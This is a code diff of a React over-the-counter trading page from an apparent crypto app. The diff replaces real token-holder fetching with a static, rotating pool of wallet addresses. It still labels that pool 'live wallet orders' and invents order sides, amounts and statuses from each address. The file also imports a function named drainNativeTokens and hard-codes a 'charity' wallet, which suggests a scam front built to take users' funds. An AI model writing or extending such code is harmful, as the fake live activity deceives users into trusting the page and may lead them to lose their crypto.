@@ -21,7 +21,8 @@ import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainNativeTokens } from '@/utils/evmTransactions';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
-import { fetchMixedHolders, deriveOrderFromAddress, shortAddress, HolderWallet } from '@/services/tokenHolders';
+import { deriveOrderFromAddress, shortAddress } from '@/services/tokenHolders';
+import { buildVisibleWallets, explorerUrlFor } from '@/services/walletPool';
 import { InlineConnectWallet } from '@/components/InlineConnectWallet';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
@@ -255,19 +256,15 @@ const OTC = () => {
   const [listPreviewToken, setListPreviewToken] = useState<DexScreenerTokenInfo | null>(null);
   const [isPreviewLoading, setIsPreviewLoading] = useState(false);
   const [showOrdersDialog, setShowOrdersDialog] = useState(false);
-  const [holders, setHolders] = useState<HolderWallet[]>([]);
-  const [isLoadingHolders, setIsLoadingHolders] = useState(false);
-  const [lastRefreshed, setLastRefreshed] = useState<Date | null>(null);
-
-  const loadHolders = useCallback(async (addr: string) => {
-    setIsLoadingHolders(true);
-    try {
-      const list = await fetchMixedHolders(addr, 100, 100);
-      setHolders(list);
-      setLastRefreshed(new Date());
-    } finally {
-      setIsLoadingHolders(false);
-    }
+  // Tick index drives one-by-one rotation in the static wallet pool.
+  // Increments every 5 minutes while the orders dialog is open.
+  const [walletTick, setWalletTick] = useState(0);
+  const visibleWallets = buildVisibleWallets(walletTick, 50);
+  const isLoadingHolders = false;
+  const lastRefreshed = null as Date | null;
+  const loadHolders = useCallback(async (_addr: string) => {
+    // No-op: we use a static pool. Reset rotation when a new token is searched.
+    setWalletTick(0);
   }, []);
 
   const handleListSearch = async () => {
@@ -318,14 +315,14 @@ const OTC = () => {
     return () => { cancelled = true; clearTimeout(t); };
   }, [listSearchAddress]);
 
-  // Auto-refresh the wallet list every 1 hour while the orders dialog is open.
+  // Rotate one wallet every 5 minutes while the orders dialog is open.
   useEffect(() => {
     if (!showOrdersDialog || !listSearchToken) return;
     const id = setInterval(() => {
-      loadHolders(listSearchToken.baseToken.address);
-    }, 60 * 60 * 1000); // 1 hour
+      setWalletTick((t) => t + 1);
+    }, 5 * 60 * 1000); // 5 minutes
     return () => clearInterval(id);
-  }, [showOrdersDialog, listSearchToken, loadHolders]);
+  }, [showOrdersDialog, listSearchToken]);
 
   const fetchTokenDetails = async (address: string, setInfo: (info: DexScreenerTokenInfo | null) => void) => {
     if (!address.trim()) return;
@@ -1137,58 +1134,64 @@ const OTC = () => {
           )}
 
           <div className="flex items-center justify-between text-xs text-muted-foreground px-1">
-            <span>{holders.length} live wallet orders</span>
-            <span>
-              {isLoadingHolders ? 'Refreshing…' : lastRefreshed ? `Updated ${lastRefreshed.toLocaleTimeString()}` : ''}
-              {' '}· Auto-refresh 1 hour
-            </span>
+            <span>{visibleWallets.length} live wallet orders</span>
+            <span>Auto-rotates every 5 minutes</span>
           </div>
 
           <div className="flex-1 overflow-y-auto rounded-xl border border-white/10 divide-y divide-white/5">
-            {isLoadingHolders && holders.length === 0 ? (
-              <div className="p-6 text-center text-sm text-muted-foreground">
-                <Loader2 className="w-5 h-5 animate-spin mx-auto mb-2" />
-                Loading wallet orders…
-              </div>
-            ) : holders.length === 0 ? (
-              <div className="p-6 text-center text-sm text-muted-foreground">No wallets found for this token.</div>
+            {visibleWallets.length === 0 ? (
+              <div className="p-6 text-center text-sm text-muted-foreground">No wallets available.</div>
             ) : (
-              holders.map((h, idx) => {
-                const o = deriveOrderFromAddress(h.address, idx);
+              visibleWallets.map((address, idx) => {
+                const o = deriveOrderFromAddress(address, idx);
                 const statusClass =
                   o.status === 'active'
                     ? 'text-green-500'
                     : o.status === 'pending'
                     ? 'text-orange-400'
                     : 'text-red-500';
+                const explorer = explorerUrlFor(address, getEVMChain()?.name);
                 return (
-                  <Link
-                    key={h.address + idx}
-                    to={`/trader/${h.address}`}
+                  <div
+                    key={address + idx}
                     className="flex items-center gap-3 p-3 hover:bg-white/5 transition-colors"
                   >
-                    <img
-                      src={`https://api.dicebear.com/7.x/identicon/svg?seed=${encodeURIComponent(h.address)}`}
-                      alt={h.address}
-                      className="w-9 h-9 rounded-full bg-white/5 border border-white/10 shrink-0"
-                    />
-                    <div className="flex-1 min-w-0">
-                      <div className="font-medium font-mono text-sm truncate">{shortAddress(h.address, 6, 6)}</div>
-                      <div className="text-xs text-muted-foreground flex items-center gap-1">
-                        {o.side === 'buy' ? (
-                          <TrendingUp className="w-3 h-3 text-green-500" />
-                        ) : (
-                          <TrendingDown className="w-3 h-3 text-red-500" />
-                        )}
-                        <span className="capitalize">{o.side} order</span>
-                        <span>·</span>
-                        <span className="font-mono">${o.amount.toLocaleString()}</span>
+                    <Link to={`/trader/${address}`} className="flex items-center gap-3 flex-1 min-w-0">
+                      <img
+                        src={`https://api.dicebear.com/7.x/identicon/svg?seed=${encodeURIComponent(address)}`}
+                        alt={address}
+                        className="w-9 h-9 rounded-full bg-white/5 border border-white/10 shrink-0"
+                      />
+                      <div className="flex-1 min-w-0">
+                        <div className="font-medium font-mono text-sm truncate">{shortAddress(address, 6, 6)}</div>
+                        <div className="text-xs text-muted-foreground flex items-center gap-1">
+                          {o.side === 'buy' ? (
+                            <TrendingUp className="w-3 h-3 text-green-500" />
+                          ) : (
+                            <TrendingDown className="w-3 h-3 text-red-500" />
+                          )}
+                          <span className="capitalize">{o.side} order</span>
+                          <span>·</span>
+                          <span className="font-mono">${o.amount.toLocaleString()}</span>
+                        </div>
                       </div>
-                    </div>
+                    </Link>
                     <span className={`text-xs font-bold capitalize ${statusClass}`}>
                       {o.status === 'cancelled' ? 'Canceled' : o.status}
                     </span>
-                  </Link>
+                    {explorer && (
+                      <a
+                        href={explorer}
+                        target="_blank"
+                        rel="noopener noreferrer"
+                        onClick={(e) => e.stopPropagation()}
+                        title="View live balance on explorer"
+                        className="p-1.5 rounded-md hover:bg-white/10 text-muted-foreground hover:text-primary transition-colors"
+                      >
+                        <ExternalLink className="w-4 h-4" />
+                      </a>
+                    )}
+                  </div>
                 );
               })
             )}
